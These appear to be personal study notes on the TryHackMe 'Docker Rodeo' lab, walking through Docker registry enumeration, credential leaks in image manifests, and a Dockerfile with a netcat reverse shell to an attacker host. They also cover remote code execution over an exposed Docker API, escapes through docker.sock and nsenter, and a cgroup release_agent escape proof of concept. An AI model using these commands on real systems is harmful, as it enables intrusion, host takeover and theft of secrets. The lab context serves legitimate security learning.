- https://tryhackme.com/room/dockerrodeo

#containers 

7 vulnerabilities for Docker

## Setup

- use the AttackBox
- machine_IP `10.10.134.76`
- add machine_IP to 
	- `sudo nano /etc/hosts` 
	- `x.x.x.x docker-rodeo.thm`
	- save and close file
- create a `daemon.json` in `/etc/docker/` and add
	- ` {"insecure-registries": ["docker-rodeo.thm:5000", "docker-rodeo.thm:7000"] }`
	- save and close file
- restart Docker
	- `sudo systemctl stop docker` wait 30 seconds
	- `sudo systemctl start docker`

Dockerfile example
```yml
FROM debian:jessie

LABEL description="My Docker Image has Debian Jessie"

RUN echo "here is a flag" > /root/root.txt

```

## Docker Registries

Docker Registries are used to store and provide published Docker images for use.
Using repositories, creators of Docker images can switch between multiple versions of their applications and share them with other people with ease.

- public DockerHub
- private registry from organizations

Example:
- RustScan DockerHub registry shows various tags for versions
- ` docker pull rustscan/rustscan:1.8.0` or `docker pull rustscan/rustscan:latest `
- the repository stores data about every tag {exploit} and Docker images are just instructions (reverse engineer) 

NMAP
- Docker Registry runs on port 5000 (default)
- ` sudo nmap -sV x.x.x.x `
- returns which ports are open and which version of the API
- Docker Registry is JSON endpoint, need to query it using Postman etc
- Docker Registry routes: https://docs.docker.com/registry/spec/api/

```
5000/tcp   open http  Docker Registry (API: 2.0)
7000/tcp   open http  Docker Registry (API: 2.0)
```

### Discover Docker Repositories 

- need a GET request
- ` http://docker-rodeo.thm:5000/v2/_catalog` to list all repos registered 

Postman returns
```JSON
{
 "repositories":[
    "cmnatic/myapp1",
    "dive/challenge",
    "dive/example"
    ]
}
```

- focus on `cmnatic/myapp1`
- need repo name (`cmnatic/myapp1`) and tags published

send a GET request
- ` http://docker-rodeo.thm:5000/v2/repository/name/tags/list ` to get all tags
- ` http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list `
- 
Postman returns
```JSON
{
  "name": "cmnatic/myapp1",
  "tags": ["notsecure", "latest", "secured"]
}
```

GET DATA
- we have name `cmnatic/myapp1` and tag `notsecure` 
- GET the manifest file
- ` http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure `
- we get the history, there was a command `echo \\\"here's a flag\\\" \\u003e /root/root.txt"]`
- 
---
- 7000

What is the name of the repository within this registry?
-  `http://docker-rodeo.thm:7000/v2/_catalog` 
- `securesolutions/webserver`
-  ` http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list `
- `production`

What is the Username in the database configuration?
- `http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production 
- look for `"Username: admin"\\\\nPassword: production_admin `
---

## Reverse Engineering Docker Images

we can get Docker registries data without authentication 

- for reverse engineering, there's a tool Dive https://github.com/wagoodman/dive
- Dive acts as MITM when we run a container, it monitors and reassembles how each layer is created and the containers file system at each stage
- download Docker image to decompile ` docker pull docker-rodeo.thm:5000/dive/example`
- if errors, do Setup again
- install dive: https://github.com/wagoodman/dive#installation
- `docker pull wagoodman/dive`
- `docker images` 
- and see the `/dive/example` with IMAGE ID ` 398736241322 ` 
- `dive 398736241322`

the terminal screen is full of data, 4 different views
- Layers = shows layers and stages of the docker container
- Current Layer Contents = shows container's filesystem
- Layer Details 
- use arrow keys and tab for window navigation
- you can see the commands that were used in building container
- TAB + q  to quit

![[Screen Shot 2023-10-05 at 10.58.17 AM.png]]

---

- `docker pull docker-rodeo.thm:5000/dive/challenge` 
- ` dive 2a0a63ea5d88` 
- 7
- user added `uogctf`
---

## Upload Malicious Docker Image

we can upload (or `push`) our own images to a repository, containing malicious code.
- every container will have a `latest` tag

when `docker run` or `docker pull` Docker tried to find a copy of the image on the host then check if there have been changes it was pulled from, if changes then updated image will be downloaded on the host and execute code

```yml
FROM debian:jessie-slim
RUN apt-get update -y
RUN apt-get install netcat -y
RUN nc -e /bin/sh x.x.x.x 8080
```
have netcat connect to attacker from inside the Docker container
- run `docker build`
- in terminal window `nc -lvnp 8080` for port listening , but this would connect the image as root and not actual host

## Docker RCE 

Sockets run Unix or TCP socket
Docker uses groups
Docker automation tools like Portainer or DevOps apps Jenkins to test their program

enumerate the host and look for exposed service
- port 2375 (default)
- `nmap -sV -p- x.x.x.x`
- `2375/tcp open docker Docker 19.03.13`
- confirm port is open `curl http://x.x.x.x:2375/version`

curl returns
```
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.13","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2020-09-16T17:01:06.000000000+00:00","Experimental":"false","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","KernelVersion":"4.15.0-123-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.3.7","Details":{"GitCommit":"8fba4e9a7d01810a393d5d25a3621dc101981175"}},{"Name":"runc","Version":"1.0.0-rc10","Details":{"GitCommit":"dc9208a3303feef5b3839f4323d9beb36df0a9dd"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.13","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"4484c46d9d","GoVersion":"go1.13.15","Os":"linux","Arch":"amd64","KernelVersion":"4.15.0-123-generic","BuildTime":"2020-09-16T17:01:06.000000000+00:00"}
```

Docker command using the `-H` to specify the instance to list containers running
- `docker -H tcp://x.x.x.x:2375 ps `
-  `docker -H tcp://x.x.x.x:2375 network ls `
- `docker -H tcp://x.x.x.x:2375 images `
- `docker -H tcp://x.x.x.x:2375 exec `
- `docker -H tcp://x.x.x.x:2375 run `

try to gain a shell on some containers using a tool `rootplease` https://registry.hub.docker.com/r/chrisfosterelli/rootplease

```
git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
cd rootplease
docker build -t rootplease .
docker run -v /:/hostOS -it --rm rootplease
```
- type exit 

## Docker daemon

assume we managed to gain a foothold onto the container via vulnerable website running in a container

CONNECT TO CONTAINER
- `x.x.x.x`
- SSH port 2233
- `danny:danny`
- ` ssh danny@x.x.x.x -p 2233`
- `whoami` danny

LOOK FOR DOCKER SOCKET
- `cd /var/run`
- `ls -la | grep sock` returns `docker.sock`
- `groups`  returns danny docker

MOUNT HOST VOLUMES
the AttackBox has Alpine Linux already but normally you need to upload this image to the container before you execute it

mount a host directory to a new container then connect to it and access host OS
- `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- `whoami`  root
- `id`
- `groups`
- exit 

---

Namespaces essentially segregate system resources such as processes, files and memory away from other namespaces.
- namespace
- process ID (PID)

Ubuntu uses `systemd` and controls processes

connect to instance via SSH
- `x.x.x.x`
- SSH port 2244
- `root:danny`
- `ssh root@x.x.x.x -p 2244`
- `ps aux`

use the [nsenter command](https://man7.org/linux/man-pages/man1/nsenter.1.html) which allows you to execute start processes and place them within the same namespace as another process
- `nsenter --target 1 --mount sh`
- targeting the `/sbin/init` 
- ` cd /home` = `cmnatic`
- `hostname` = ` 63b932f4d7d2 `
- `hostnamectl` 
![[Screen Shot 2023-10-05 at 12.35.48 PM.png]]

## Misconfigured Privileges

Docker can run as:
- user mode
- privileged mode, bypasses Docker engineer and has direct communication with OS

use the system package `libcap2-bin capsh` to list capabilities for container
- `capsh --print`
- start a new machine

CONNECT via SSH
- `x.x.x.x`
- SSH port 2244
- `root:danny`
- `capsh --print | grep sys_admin`
- this allows us to do various things listed [here](https://linux.die.net/man/7/capabilities)
- focus is on `sys_admin` being able to mount files from host OS into container
- `cd /` > `ls` = flag.txt
- ` thm{you_escaped_the_chains} `

---

proof of concept
```
mkdir /tmp/cgrp && mount -t group -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release

host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

echo "$host_path/exploit" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /exploit

echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

chmod a+x /exploit

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

```

Code snippets summary

We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "`cgroups`" to manage processes on the operating system since we have capabilities to manage "`cgroups`" as root on the host, we'll mount this to "`/tmp/cgrp`" on the container.

For our exploit to execute, we'll need to tell Kernel to run our code. By adding "1" to "`/tmp/cgrp/x/notify_on_release`", we're telling the kernel to execute something once the "`cgroup`" finishes.

We find out where the containers files are stored on the host and store it as a variable

Where we then echo the location of the containers files into our "`/exploit`" and then ultimately to the "release_agent" which is what will be executed by the "`cgroup`" once it is released.

---

## Securing your container

Principle of least privileges, Docker commands run as root unless told otherwise

Docker Seccomp (Secure computing) = restrict capability of a container by determining the system calls it can make
- http://docs.docker.oeynet.com/engine/security/seccomp/#pass-a-profile-for-a-container
- prevent mount namespace 

securing your daemon
- running a Docker registry relies on use of self-signed SSL certs behind a web server (not quick, is a hassle)

## in a container?

a Docker container has far fewer processes running vs a VM

look for a `.dockerenv` file in the `/` directory

`cgroups` has paths to the word `docker` 

## Additional

other exploits for Docker

- https://github.com/dirtycow/dirtycow.github.io
- https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/
- https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so
- https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent

